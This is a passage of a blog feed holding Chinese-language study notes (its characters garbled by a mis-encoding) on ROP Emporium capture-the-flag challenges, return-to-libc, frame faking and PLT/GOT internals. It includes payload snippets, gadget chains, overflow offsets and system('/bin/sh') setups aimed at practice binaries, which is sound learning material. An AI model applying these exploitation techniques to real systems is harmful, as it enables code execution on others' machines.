$0x10 80483db:    e9 c0 ff ff ff           jmp    80483a0 &lt;.plt&gt;</code></pre><p><code>objdump -j .plt -d ./write432</code>å‘½ä»¤æ•ˆæœä¸€æ ·</p><pre><code>ROPgadget --binary ./write432 --only &#39;mov|ret&#39;ROPgadget --binary ./write432 --only &#39;mov|ret&#39; | grep ebx</code></pre><p><strong>è¦ç‚¹ï¼š</strong>print_fileå‚æ•°æ˜¯ä¸€ä¸ªåœ°å€ï¼Œæ‰€ä»¥ä¸èƒ½ç”¨å­—ç¬¦ä¸²</p><pre><code>0x00001018    0x8 0x0804a018    0x8 -rw- .data</code></pre><p>æˆ‘é€‰æ‹©æŠŠå­—ç¬¦ä¸²æ”¾åˆ°dataæ®µä¸Šã€‚</p><pre><code>dataaddress=p32(0x0804a018)data1=b&#39;flag&#39;data2=b&#39;.txt&#39;</code></pre><p>ç¬¬ä¸€æ¬¡æˆ‘æ•°æ®æ²¡æœ‰åˆ†å¼€ï¼Œebpåªæœ‰32ä½ï¼Œä¸€æ¬¡åªèƒ½ä¼ 4å­—èŠ‚ï¼Œæˆ‘ç¬¬ä¸€æ¬¡ç«Ÿç„¶æ²¡æœ‰è®¤è¯†åˆ°</p><h3 id="64ä½"><a href="#64ä½" class="headerlink" title="64ä½"></a>64ä½</h3><pre><code>â”‚           0x0040061b      bfb4064000     mov edi, str.nonexistent    ; 0x4006b4 ; &quot;nonexistent&quot;â”‚           0x00400620      e8ebfeffff     call sym.imp.print_file</code></pre><p>å‚æ•°ä¼ åˆ°RDI<br>    #0x0000000000400628 : mov qword ptr [r14], r15 ; ret<br>    #0x0000000000400690 : pop r14 ; pop r15 ; ret<br>    #0x0000000000400693 : pop rdi ; ret</p><pre><code>gadget=popret+dataaddress+data+movretgadget+=popret1+dataaddressgadget+=printfile</code></pre><h2 id="badchars"><a href="#badchars" class="headerlink" title="badchars"></a>badchars</h2><h3 id="32ä½-1"><a href="#32ä½-1" class="headerlink" title="32ä½"></a>32ä½</h3><p> Badchars are the reason that encoders such as shikata-ga-nai exist.<br>è¿™é‡Œï¼Œä¼šå°†badcharsæ›¿æ¢ä¸º<code>0xeb</code></p><p><em>IDAæ°¸è¿œçš„ç¥</em><br>åç¼–è¯‘</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">pwnme</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v1; <span class="comment">// [esp+0h] [ebp-38h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> i; <span class="comment">// [esp+4h] [ebp-34h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> j; <span class="comment">// [esp+8h] [ebp-30h]</span></span><br><span class="line">  <span class="keyword">char</span> v4[<span class="number">36</span>]; <span class="comment">// [esp+10h] [ebp-28h]</span></span><br><span class="line"></span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;badchars by ROP Emporium&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;x86\n&quot;</span>);</span><br><span class="line">  <span class="built_in">memset</span>(v4, <span class="number">0</span>, <span class="number">0x20</span>u);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;badchars are: &#x27;x&#x27;, &#x27;g&#x27;, &#x27;a&#x27;, &#x27;.&#x27;&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;&gt; &quot;</span>);</span><br><span class="line">  v1 = read(<span class="number">0</span>, v4, <span class="number">0x200</span>u);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; v1; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">for</span> ( j = <span class="number">0</span>; j &lt;= <span class="number">3</span>; ++j )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( v4[i] == badcharacters[j] )</span><br><span class="line">        v4[i] = <span class="number">-21</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;Thank you!&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="å‘½ä»¤-1"><a href="#å‘½ä»¤-1" class="headerlink" title="å‘½ä»¤"></a>å‘½ä»¤</h3><p><code>man 7 ascii</code><br>æŸ¥çœ‹asciiè¡¨</p><p><code>ropper --file ./badchars32 -b 6167782e</code><br>ropperæ’é™¤badcharsæ˜¯è¿™æ ·ç”¨çš„ï¼ŒROPgadgetä¹Ÿæ˜¯ä¸€æ ·çš„</p><p>gdb_peda: <code>æŸ¥çœ‹æº¢å‡ºç‚¹</code></p><pre><code>gdb-peda$ pattern_create 100gdb-peda$ pattern_offset AFAAAFAA found at offset: 44</code></pre><p><code>pwndbg&gt; rop --grep xor -- --badbytes 6167782e --ropchain --nojop</code></p><h3 id="å¯„å­˜å™¨è§£æ"><a href="#å¯„å­˜å™¨è§£æ" class="headerlink" title="å¯„å­˜å™¨è§£æ"></a>å¯„å­˜å™¨è§£æ</h3><p>bl is the name of the low 8 bits (bits 7-0) in the ebx register. There is also bh which is the bits 15-8 of ebx, and bx is the low 16 bits (bits 15-0). There is no name for the higher 16 bits.</p><p>This applies to all of the registers eax, ebx, ecx and edx.<br>æé”™äº†ï¼Œblä¸æ˜¯ebpä¸­ï¼Œè€Œæ˜¯ebx<br><a href="https://blog.csdn.net/ww506772362/article/details/75530723">https://blog.csdn.net/ww506772362/article/details/75530723</a></p><p>ç–‘é—®ï¼š<br>æˆ‘ç¬¬ä¸€æ¬¡ä¼ xor å‚æ•°ebx çš„æ—¶å€™æ˜¯00 00 00 8a , æ”¾åœ¨æ ˆä¸­æ˜¯00 00 00 8a , pop ebx , æ˜¯å€’å–è¯»å…¥?<br>æ‰€ä»¥æ˜¯8a 00 00 00</p><p>EBP: 0x41304141 (â€˜AA0Aâ€™)</p><h3 id="64ä½-1"><a href="#64ä½-1" class="headerlink" title="64ä½"></a>64ä½</h3><h3 id="r14b"><a href="#r14b" class="headerlink" title="r14b"></a>r14b</h3><p>r14 r14d r14w r14b<br>æœ‰ä¸ªå‘<br>xçš„ä½ç½®åˆšå¥½æ˜¯2eä¼šè¢«æ›¿æ¢</p><p><code>Failed to open file: flag.t\xebt</code></p><p>ç›®å‰æ²¡æœ‰æ‰¾åˆ°å¯ä»¥ç”¨çš„gadget</p><h2 id="fluff"><a href="#fluff" class="headerlink" title="fluff"></a>fluff</h2><p>åŒæ ·æ²¡æœ‰æœ‰ç”¨çš„gadget<br>mov [e?x],<br>xchg  [ecx],dl<br>pext edx, ebx, eax</p><p>pext è§£æ<br><a href="https://blog.csdn.net/qq_43401808/article/details/86540472">https://blog.csdn.net/qq_43401808/article/details/86540472</a></p><p>è¿™æ¡å‘½ä»¤èƒ½ç”¨ï¼Œä½†æ˜¯æ²¡æœ‰<code>pop eax</code></p>]]></content>
    
    
    <summary type="html">&lt;p&gt;ROP Emporium write4,badchars,fluff&lt;br&gt;write4å’Œbadcharséƒ½è§£å‡ºæ¥äº†ï¼Œfluffæ‰¾ä¸åˆ°æœ‰ç”¨çš„gadget&lt;br&gt;ä»£ç ï¼š&lt;a href=&quot;https://github.com/Finsenty54/attack-code/tree/master/ROPemporium&quot;&gt;https://github.com/Finsenty54/attack-code/tree/master/ROPemporium&lt;/a&gt;&lt;/p&gt;</summary>
    
    
    
    <category term="rop_emporium" scheme="http://finsenty54.github.io/categories/rop-emporium/"/>
    
    
    <category term="PWN" scheme="http://finsenty54.github.io/tags/PWN/"/>
    
  </entry>
  
  <entry>
    <title>&lt;&lt;åŸºæœ¬ROP_ropemporiumå‰ä¸‰é¢˜</title>
    <link href="http://finsenty54.github.io/2021/01/11/%E5%9F%BA%E6%9C%ACROP/"/>
    <id>http://finsenty54.github.io/2021/01/11/%E5%9F%BA%E6%9C%ACROP/</id>
    <published>2021-01-11T06:27:27.000Z</published>
    <updated>2021-01-11T06:30:50.851Z</updated>
    
    <content type="html"><![CDATA[<p>ç®€å•çš„ROPå­¦ä¹ ï¼Œæ²¡æœ‰å¼€å¯PIE</p><h2 id="Bypassing-NX-bit-using-chained-return-to-libc"><a href="#Bypassing-NX-bit-using-chained-return-to-libc" class="headerlink" title="Bypassing NX bit using chained return-to-libc"></a>Bypassing NX bit using chained return-to-libc</h2><p><a href="https://sploitfun.wordpress.com/2015/05/08/bypassing-nx-bit-using-chained-return-to-libc/">https://sploitfun.wordpress.com/2015/05/08/bypassing-nx-bit-using-chained-return-to-libc/</a></p><p>system address + exit address + system+args<br>exitç›¸å½“äºä¸‹ä¸€æ­¥åœ°å€ï¼Œå› ä¸ºä¸æ˜¯è°ƒç”¨call, ä¸ä¼šå‹å…¥ä¸‹ä¸€æ­¥åœ°å€</p><a id="more"></a><p>chaining seteuid, system and exit</p><p>é—®é¢˜ï¼š<br>1 seteuid_arg should be<code> zero</code><br>2 place function argument of both libc functionsï¼Œï¼Œï¼Œ a function argument of one libc function and an address of another libc function which is obviously not possible</p><p>seteuid_addr + system_addr + <code>seteuid_addr / exit_addr </code>+ system_arg<br> seteuid_addr / exit_addr è¿™é‡Œå†²çªäº†ï¼Œå½“ç„¶æ˜¯å¯ä»¥èˆå¼ƒexitçš„</p><p>è§£å†³é—®é¢˜2ï¼š<br><a href="http://phrack.org/issues/58/4.html">http://phrack.org/issues/58/4.html</a><br>ESP Lifting<br><code>Frame Faking</code></p><p>esp lifting technique binary should be compiled without frame pointer (-fomit-frame-pointer) support.</p><p>Frame Fakingï¼š</p><pre><code>ç”¨â€œleave retâ€ instruction è¦†ç›–è¿”å›åœ°å€leave = mov esp,ebp ; pop ebpret = pop EIP</code></pre><p><a href="https://imgchr.com/i/sMz61K"><img src="https://s3.ax1x.com/2021/01/09/sMz61K.png" alt="sMz61K.png"></a></p><p>ç¬¬ä¸€æ¬¡æ‰§è¡Œleave;retæ—¶ï¼Œæ­¤æ—¶ebpå·²ç»æ˜¯fake_ebp1çš„åœ°å€å€¼ï¼Œæ‰§è¡Œå®Œleaveåï¼Œespæ˜¯seteuid_addrçš„åœ°å€ï¼Œebpæ˜¯fake_ebp2çš„åœ°å€å€¼ï¼Œæ‰§è¡Œretåï¼Œå°†<code>seteuid_addræ¨å‘eip</code>ï¼Œå‚æ•°åœ¨ebp+0x4ï¼›ä¹‹ååŒç†ï¼Œå¯ä»¥æ‰§è¡Œsystem()</p><p>è§£å†³é—®é¢˜1ï¼š<br>strcpy which copies a NULL byte into seteuid_argâ€™s stack location<br>using sprintf NULL byte is copied in to seteuid_argâ€™s stack location</p><p>ROP<br>system(â€œ/bin/shâ€)</p><p>push binsh_addr<br>call system</p><p>call system=<br>push eip+5<br>jmp system</p><p>æ‰€ä»¥æ ˆä¸­systemåœ°å€è¦å’Œå‚æ•°éš”å››ä¸ªå­—èŠ‚ï¼Œå› ä¸ºä¸­é—´è¿˜è¦æ”¾è¿”å›åœ°å€</p><h2 id="ROP"><a href="#ROP" class="headerlink" title="ROP"></a>ROP</h2><p><a href="https://www.exploit-db.com/docs/english/28479-return-oriented-programming-(rop-ftw).pdf">https://www.exploit-db.com/docs/english/28479-return-oriented-programming-(rop-ftw).pdf</a></p><h3 id="ROPå®šä¹‰ï¼š"><a href="#ROPå®šä¹‰ï¼š" class="headerlink" title="ROPå®šä¹‰ï¼š"></a>ROPå®šä¹‰ï¼š</h3><p>utilizing <strong>small instruction sequences **available in either the binary or libraries linked to the application called **gadgets</strong></p><p>ROP gadgets are small instruction sequences <strong>ending with a â€œretâ€ instruction â€œc3â€</strong>.</p><p>The ROP gadget has to end with a â€œretâ€ to enable us to perform multiple sequences. Hence it is called** return oriented.**<br>æ‰€ä»¥æ‰å«return , gadgetåé¢éƒ½è·Ÿç€ret</p><h3 id="æœ‰ç”¨çš„gadget"><a href="#æœ‰ç”¨çš„gadget" class="headerlink" title="æœ‰ç”¨çš„gadget"></a>æœ‰ç”¨çš„gadget</h3><p>1- We search the binary for all â€œretâ€ (c3) byte.<br>2- We go backwards to see if the previous byte contains a valid instruction. We reverse to the maximum number of bytes that can make a valid instruction (20 bytes).<br>3- We then record all valid instruction sequences found in the binary or linked libraries.</p><h4 id="Loading-a-constant-into-register"><a href="#Loading-a-constant-into-register" class="headerlink" title="Loading a constant into register"></a>Loading a constant into register</h4><p>POP eax; ret;</p><p>æ ˆ;<br>Address of POP EAX/RET gadget<br>0xdeadbeef<br>Address of next gadget</p><h4 id="Loading-from-memory"><a href="#Loading-from-memory" class="headerlink" title="Loading from memory"></a>Loading from memory</h4><p>mov ecx,[eax]; ret</p><h4 id="Storing-into-memory"><a href="#Storing-into-memory" class="headerlink" title="Storing into memory"></a>Storing into memory</h4><p>Mov [eax],ecx; ret</p><h4 id="Arithmetic-operations"><a href="#Arithmetic-operations" class="headerlink" title="Arithmetic operations"></a>Arithmetic operations</h4><p>add eax,0x0b; ret<br>xor edx,edx;ret</p><h4 id="System-call"><a href="#System-call" class="headerlink" title="System call"></a>System call</h4><p>int 0x80; ret<br>call gs:[0x10]; ret</p><h4 id="å‘½ä»¤ï¼š"><a href="#å‘½ä»¤ï¼š" class="headerlink" title="å‘½ä»¤ï¼š"></a>å‘½ä»¤ï¼š</h4><p>what libs are linked to the binary<br>gdb:<br><code>info files</code></p><pre><code>ps -aux | grep rop2cat /proc/28119/maps</code></pre><p> system call number of execve() is â€œ11â€ or â€œ0xbâ€<br> linux system call numbers in â€œ/usr/include/i386-linux-gnu/asm/unistd_32.h â€œ<br>grep execve</p><p>it wont affect the command â€œ/bin/shâ€ is as<br>â€œ/bin//shâ€.</p><p><code>ROPradget --strings </code></p><h2 id="å­¦ä¹ ROPçš„ç»ƒä¹ å¹³å°ropemporium"><a href="#å­¦ä¹ ROPçš„ç»ƒä¹ å¹³å°ropemporium" class="headerlink" title="å­¦ä¹ ROPçš„ç»ƒä¹ å¹³å°ropemporium"></a>å­¦ä¹ ROPçš„ç»ƒä¹ å¹³å°ropemporium</h2><p><a href="https://ropemporium.com/index.html">https://ropemporium.com/index.html</a></p><p>èµ·æ‰‹å¼å‘½ä»¤ï¼›ï¼›</p><h3 id="Confirming-protections"><a href="#Confirming-protections" class="headerlink" title="Confirming protections"></a>Confirming protections</h3><pre><code>$ rabin2 -I &lt;binary&gt;$ pwn checksec &lt;binary&gt;</code></pre><h3 id="Function-names-ç¬¦å·è¡¨symbols"><a href="#Function-names-ç¬¦å·è¡¨symbols" class="headerlink" title="Function names ç¬¦å·è¡¨symbols"></a>Function names ç¬¦å·è¡¨symbols</h3><pre><code>$ rabin2 -i &lt;binary&gt;$ nm -u &lt;binary&gt;$ nm ret2win|grep &#39; t &#39;Listing just those functions written by the programmer is harder, a rough approximation could be:$ rabin2 -qs &lt;binary&gt; | grep -ve imp -e &#39; 0 &#39;-s              symbolsgrep-q              be quiet, just show fewer data-v, --invert-match        select non-matching lines-e, --regexp=PATTERNS     use PATTERNS for matching</code></pre><h3 id="Strings"><a href="#Strings" class="headerlink" title="Strings"></a>Strings</h3><p>æŸ¥æ‰¾ç¨‹åºä¸­å­—ç¬¦ä¸²</p><ol><li><p><code>strings -d ./ret2win32</code></p></li><li><p><code>$ rabin2 -z split</code><br>åç§»åœ°å€éƒ½ç»™å‡ºäº†</p></li><li><p><code>ROPgadget --bianry --strings &#39;/bin/sh&#39;</code></p></li></ol><p>dmesg [options]<br>Display or control the kernel ring buffer.<br>For a quick and dirty confirmation of how many bytes are needed to cause an overflow </p><h3 id="é¢˜ç›®ï¼šï¼š"><a href="#é¢˜ç›®ï¼šï¼š" class="headerlink" title="é¢˜ç›®ï¼šï¼š"></a>é¢˜ç›®ï¼šï¼š</h3><p><a href="https://blog.csdn.net/SmalOSnail/article/details/106619419">https://blog.csdn.net/SmalOSnail/article/details/106619419</a><br><a href="https://github.com/TaQini/rop_emporium/blob/master/tasks">https://github.com/TaQini/rop_emporium/blob/master/tasks</a><br>å¤§ä½¬ä»£ç </p><p><a href="https://github.com/Finsenty54/attack-code/tree/master/ROPemporium">https://github.com/Finsenty54/attack-code/tree/master/ROPemporium</a><br>æˆ‘çš„è§£é¢˜ä»£ç </p><h3 id="ret2win"><a href="#ret2win" class="headerlink" title="ret2win"></a>ret2win</h3><p><code>p.sendlineafter(&#39;&gt;&#39;,b&#39;A&#39;*40+p64(0x00400756))</code><br>ä¸ç”¨è€ƒè™‘æˆªæ–­ï¼Ÿï¼Ÿ pwntoolsè‡ªè¡Œè§£å†³ï¼Œå‰å®³ğŸ‘</p><h3 id="split"><a href="#split" class="headerlink" title="split"></a>split</h3><p>32ä½<br>    payload += p32(system) +bâ€™aâ€™*4+ p32(catflag)<br>ä¸­é—´åº”è¯¥å†åŠ å››ä¸ªå­—èŠ‚ï¼Œä½œä¸ºè¿”å›åœ°å€</p><p>64ä½ä¸‹ä¼ å‚</p><pre><code>[0x00400742]&gt; pdfâ”Œ 17: sym.usefulFunction ();â”‚           0x00400742      55             push rbpâ”‚           0x00400743      4889e5         mov rbp, rspâ”‚           0x00400746      bf4a084000     mov edi, str.bin_ls         ; 0x40084a ; &quot;/bin/ls&quot; ; const char *stringâ”‚           0x0040074b      e810feffff     call sym.imp.system         ; int system(const char *string)â”‚           0x00400750      90             nopâ”‚           0x00400751      5d             pop rbpâ””           0x00400752      c3             ret</code></pre><p>å­—ç¬¦ä¸²ä¼ åˆ°äº† <code>$edi</code></p><p>æ‰€ä»¥è¦æŠ¥å­—ç¬¦ä¸²åœ°å€ä¼ åˆ°RDIä¸­<br><a href="https://www.megabeets.net/a-journey-into-radare-2-part-2/#Searching">https://www.megabeets.net/a-journey-into-radare-2-part-2/#Searching</a><br><a href="https://trustfoundry.net/basic-rop-techniques-and-tricks/">https://trustfoundry.net/basic-rop-techniques-and-tricks/</a></p><h3 id="å¦‚ä½•æœç´¢gadget"><a href="#å¦‚ä½•æœç´¢gadget" class="headerlink" title="å¦‚ä½•æœç´¢gadget"></a>å¦‚ä½•æœç´¢gadget</h3><p><a href="https://ropemporium.com/guide.html">https://ropemporium.com/guide.html</a><br>äº”ç§å·¥å…·ï¼Œæˆ‘ç”¨äº†radare2 å’Œ ROPgadget</p><h4 id="radare2ä¸­"><a href="#radare2ä¸­" class="headerlink" title="radare2ä¸­"></a>radare2ä¸­</h4><pre><code>/R [?] â€” Search for ROP gadgets/R/ â€” Search for ROP gadgets with a regular expressions</code></pre><p>å¤ªæš´åŠ›äº†</p><pre><code>[0x00400742]&gt; /R pop rdi  0x004007c3                 5f  pop rdi  0x004007c4                 c3  ret</code></pre><h4 id="ROPgadget"><a href="#ROPgadget" class="headerlink" title="ROPgadget"></a>ROPgadget</h4><p><code>ROPgadget --binary   | grep</code></p><h3 id="callme"><a href="#callme" class="headerlink" title="callme"></a>callme</h3><p>32ä½</p><pre><code>ROPgadget --binary ./callme32 --only &#39;add esp&#39;callme1=p32(0x080484f0)callme2=p32(0x08048550)callme3=p32(0x080484e0)addpopret=p32(0x080484aa)#0x080484aa : add esp, 8 ; pop ebx ; retargs1=p32(0xdeadbeef)args2=p32(0xcafebabe)args3=p32(0xd00df00d)# rop1sgadget=addpopret+args1+args2+args3offset = 44payload = b&#39;A&#39;*offsetpayload += callme1+ gadget+  callme2+gadget+callme3+gadget</code></pre><p>64ä½<br>64ä½ä¸‹ä¼ å‚</p><pre><code>â”‚           0x0040091e      ba06000000     mov edx, 6â”‚           0x00400923      be05000000     mov esi, 5â”‚           0x00400928      bf04000000     mov edi, 4â”‚           0x0040092d      e8eefdffff     call sym.imp.callme_one</code></pre><p>æ‰€ä»¥ç”¨<br>    #0x000000000040093c : pop rdi ; pop rsi ; pop rdx ; ret</p><h2 id="PLT-å’Œ-GOT-PLT"><a href="#PLT-å’Œ-GOT-PLT" class="headerlink" title="PLT å’Œ GOT.PLT"></a>PLT å’Œ GOT.PLT</h2><p> <a href="https://www.cnblogs.com/pannengzhi/p/2018-04-09-about-got-plt.html">https://www.cnblogs.com/pannengzhi/p/2018-04-09-about-got-plt.html</a><br><code>å‡½æ•°å’Œå˜é‡ä½œä¸ºç¬¦å·</code>è¢«å­˜åœ¨å¯æ‰§è¡Œæ–‡ä»¶ä¸­, ä¸åŒç±»å‹çš„ç¬¦å·åˆèšåˆåœ¨ä¸€èµ·, ç§°ä¸º<code>ç¬¦å·è¡¨</code></p><p> <a href="https://ropemporium.com/guide.html#Appendix%20A">https://ropemporium.com/guide.html#Appendix%20A</a><br>how the PLT is used in <code>lazy binding</code>?<br>Lazy binding is a technique used by the dynamic linker<br>symbol lookups for function calls into shared objects are deferred until the first time a function is actually called.<br>å¯¹å…±äº«å¯¹è±¡çš„å‡½æ•°è°ƒç”¨çš„ç¬¦å·æŸ¥æ‰¾ åªæœ‰å½“ç¬¬ä¸€ä¸ªå‡½æ•°çœŸçš„è°ƒç”¨æ—¶æ‰æŸ¥æ‰¾<br>Two program sections are used to achieve this effect<br> the<code>procedure linkage table (.plt)</code>and part of the <code>global offset table (.got.plt).</code><br>Lazy binding may be disabled by setting the LD_BIND_NOW environment variable to a nonempty string or using the RTLD_NOW flag when calling dlopen().<br>The first time an external function is called it, <strong>must be resolved</strong>. After that, all calls to it will be passed straight through to the desired function<br><code>rabin2 -R    relocations</code></p><h3 id="plt-èŠ‚"><a href="#plt-èŠ‚" class="headerlink" title=".plt èŠ‚"></a>.plt èŠ‚</h3><p><a href="https://systemoverlord.com/2017/03/19/got-and-plt-for-pwning.html">https://systemoverlord.com/2017/03/19/got-and-plt-for-pwning.html</a><br>æ¯”å¦‚3 function stubs<br>take the form <code>jmp; push; jmp</code>;. Above the stubs a <code>push; jmp;</code></p><pre><code>â–º 0x8049030  &lt;puts@plt&gt;                  jmp    dword ptr [puts@got.plt] &lt;0x804c00c&gt; </code></pre><p>é—´æ¥è·³è½¬</p><pre><code> pwndbg&gt; x/wx 0x804c00c 0x804c00c &lt;puts@got.plt&gt;:    0x08049036   0x8049036  &lt;puts@plt+6&gt;                push   0   0x804903b  &lt;puts@plt+11&gt;               jmp    0x8049020 &lt;0x8049020&gt;</code></pre><p>it turns out that because we havenâ€™t called puts before<br><strong>è¿˜æ²¡æœ‰ä½¿ç”¨putsï¼Œè·³è½¬åˆ°gotåˆè·³å›åˆ°ä¸‹ä¸€å‘½ä»¤</strong><br>æœ€åå›åˆ°<code>.plt</code>è¡¨å¼€å¤´<br>      0x8049020                              push   dword ptr [<em>GLOBAL_OFFSET_TABLE</em>+4] &lt;0x804c004&gt;<br>     â–º 0x8049026                              jmp    dword ptr [0x804c008] &lt;_dl_runtime_resolve&gt;</p><pre><code>pwndbg&gt; x/2xw 0x804c0040x804c004:    0xf7ffd980    0xf7fe9730</code></pre><p>ç¬¬ä¸€ä¸ªåœ¨è¿æ¥å™¨æ•°æ®æ®µæ˜¯<code>link_mapåœ°å€</code>ï¼Œç¬¬äºŒä¸ªåœ¨è¿æ¥å™¨æ‰§è¡Œä»£ç å¤„æ˜¯<code>_dl_runtime_resolveåœ°å€</code><br>pltå¼€å¤´ä¸¤ä¸ªæ˜¯æ¥ç¬¬ä¸€æ¬¡è¿è¡Œæ—¶æŸ¥åœ°å€çš„</p><p>å› æ­¤, å®é™…ä¸Š(ç¬¬ä¸€æ¬¡)è°ƒç”¨puts@pltå°±ç›¸å½“äºè°ƒç”¨äº†<br><code>_dl_runtime_resolve((link_map *)m, 0)!</code> å…¶ä¸­link_mapæä¾›äº†è¿è¡Œæ—¶çš„å¿…è¦ä¿¡æ¯,<br>è€Œ0åˆ™æ˜¯putså‡½æ•°çš„åç§»<code>(åœ¨puts@pltä¸­push 0x0)</code>.</p><p>resolveæ‰§è¡Œå®Œåï¼šï¼š<br>    pwndbg&gt; disass â€˜puts@pltâ€™<br>    Dump of assembler code for function puts@plt:<br>       0x08049030 &lt;+0&gt;:    jmp    DWORD PTR ds:0x804c00c<br>       0x08049036 &lt;+6&gt;:    push   0x0<br>       0x0804903b &lt;+11&gt;:    jmp    0x8049020<br>    End of assembler dump.</p><pre><code>pwndbg&gt; x/wx 0x804c00c0x804c00c &lt;puts@got.plt&gt;:    0xf7e303c0pwndbg&gt; info symbol 0xf7e303c0puts in section .text of /lib/i386-linux-gnu/libc.so.6</code></pre><p>æ‰¾åˆ°putsçš„ä»£ç åœ°å€</p><h3 id="æ”»å‡»é˜²å¾¡"><a href="#æ”»å‡»é˜²å¾¡" class="headerlink" title="æ”»å‡»é˜²å¾¡"></a>æ”»å‡»é˜²å¾¡</h3><p>é˜²æ­¢å†™got.pltè¡¨<br><code>Enter relocations read-only, or RELRO.</code></p><p>a strategy was developed to allow looking up all of these addresses when the program was run and providing a mechanism to call these functions from libraries. This is known as relocation</p><h3 id="got"><a href="#got" class="headerlink" title=".got"></a>.got</h3><p>This is the GOT, or Global Offset Table. This is the <code>actual table of offsets </code>as filled in by the linker for external symbols.<br>.plt<br>This is the PLT, or Procedure Linkage Table. These are stubs that look up the addresses in the .got.plt section, and either jump to the right address, or trigger the code in the linker to look up the address. (If the address has not been filled in to .got.plt yet.)<br>.got.plt<br>This is the GOT for the PLT. It contains the<code>target addresses</code>(after they have been looked up) or an address back in the .plt to trigger the lookup. Classically, this data was part of the .got section</p><p>.GOT å¼€å¤´åŒ…å«å®é™…åœ°å€ï¼Œ.pltå¼€å¤´æ˜¯è¦è·³è½¬åˆ°ç›®æ ‡<br>pwndbg&gt; x/i $pc<br>=&gt; 0x804845f &lt;main+36&gt;:    call   0x8048300 &lt;puts@plt&gt;</p><p>.got.pltè¡¨å†…å®¹<br>got0: æœ¬ELFåŠ¨æ€æ®µ(.dynamicæ®µ)çš„è£…è½½åœ°å€<br>got1: æœ¬ELFçš„link_mapæ•°æ®ç»“æ„æè¿°ç¬¦åœ°å€<br>got2: _dl_runtime_resolveå‡½æ•°çš„åœ°å€<br><a href="https://ropemporium.com/image/example_gotplt_section.png"><img src="https://ropemporium.com/image/example_gotplt_section.png"></a></p><hr><h2 id="x86-get-pc-thunk-ax"><a href="#x86-get-pc-thunk-ax" class="headerlink" title="__x86.get_pc_thunk.ax"></a>__x86.get_pc_thunk.ax</h2><p>objdump -d main_pi | grep â€œ__x86.get_pc_thunk.axâ€ -A 2<br>000006ad &lt;__x86.get_pc_thunk.ax&gt;:<br> 6ad:    8b 04 24                 mov    eax,DWORD PTR [esp]<br> 6b0:    c3                       ret<br>ä½œç”¨å°±æ˜¯æŠŠesp(å³è¿”å›åœ°å€)çš„å€¼ä¿å­˜åœ¨eax(PICå¯„å­˜å™¨)ä¸­, åœ¨æ¥ä¸‹æ¥å¯»å€ç”¨<br>è¯¦è§<a href="https://www.cnblogs.com/pannengzhi/p/2018-04-09-about-got-plt.html">https://www.cnblogs.com/pannengzhi/p/2018-04-09-about-got-plt.html</a></p><h2 id="CTF-WIKI-ROP"><a href="#CTF-WIKI-ROP" class="headerlink" title="CTF-WIKI ROP"></a>CTF-WIKI ROP</h2><p><a href="https://ctf-wiki.org/pwn/linux/stackoverflow/basic-rop/">https://ctf-wiki.org/pwn/linux/stackoverflow/basic-rop/</a><br>ROP</p><h3 id="å‘½ä»¤"><a href="#å‘½ä»¤" class="headerlink" title="å‘½ä»¤"></a>å‘½ä»¤</h3><p><code>gdb vmmap </code></p>]]></content>
    
    
    <summary type="html">&lt;p&gt;ç®€å•çš„ROPå­¦ä¹ ï¼Œæ²¡æœ‰å¼€å¯PIE&lt;/p&gt;
&lt;h2 id=&quot;Bypassing-NX-bit-using-chained-return-to-libc&quot;&gt;&lt;a href=&quot;#Bypassing-NX-bit-using-chained-return-to-libc&quot; class=&quot;headerlink&quot; title=&quot;Bypassing NX bit using chained return-to-libc&quot;&gt;&lt;/a&gt;Bypassing NX bit using chained return-to-libc&lt;/h2&gt;&lt;p&gt;&lt;a href=&quot;https://sploitfun.wordpress.com/2015/05/08/bypassing-nx-bit-using-chained-return-to-libc/&quot;&gt;https://sploitfun.wordpress.com/2015/05/08/bypassing-nx-bit-using-chained-return-to-libc/&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;system address + exit address + system+args&lt;br&gt;exitç›¸å½“äºä¸‹ä¸€æ­¥åœ°å€ï¼Œå› ä¸ºä¸æ˜¯è°ƒç”¨call, ä¸ä¼šå‹å…¥ä¸‹ä¸€æ­¥åœ°å€&lt;/p&gt;</summary>
    
    
    
    <category term="rop_emporium" scheme="http://finsenty54.github.io/categories/rop-emporium/"/>
    
    
    <category term="PWN" scheme="http://finsenty54.github.io/tags/PWN/"/>
    
  </entry>
  
  <entry>
    <title>Stack buffer overflow basic 5</title>
    <link href="http://finsenty54.github.io/2021/01/08/Stack_buffer_overflow_basic_5/"/>
    <id>http://finsenty54.github.io/2021/01/08/Stack_buffer_overflow_basic_5/</id>
    <published>2021-01-08T05:34:58.000Z</published>
    <updated>2021-01-08T05:35:42.406Z</updated>
    
